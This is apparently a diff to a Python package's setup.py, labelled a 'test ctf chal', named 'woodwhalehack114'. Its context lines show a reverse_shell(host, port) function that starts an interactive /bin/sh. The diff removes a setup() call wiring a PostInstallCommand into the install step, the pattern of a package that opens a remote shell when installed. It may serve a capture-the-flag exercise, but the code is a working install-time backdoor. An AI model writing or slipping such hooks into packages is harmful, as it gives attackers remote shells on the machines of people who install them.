@@ -26,17 +26,4 @@ def reverse_shell(host, port):
     p = subprocess.call(["/bin/sh", "-i"])
 
 
-setup(
-    name='woodwhalehack114',
-    version='1.3',
-    author='Your Name',
-    author_email='your_email@example.com',
-    description='test ctf chal',
-    packages=['woodwhalehack114'],
-    install_requires=[
-        'requests',  # 举例：添加你需要的依赖项
-    ],
-    cmdclass={
-        'install': PostInstallCommand,
-    }
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                 
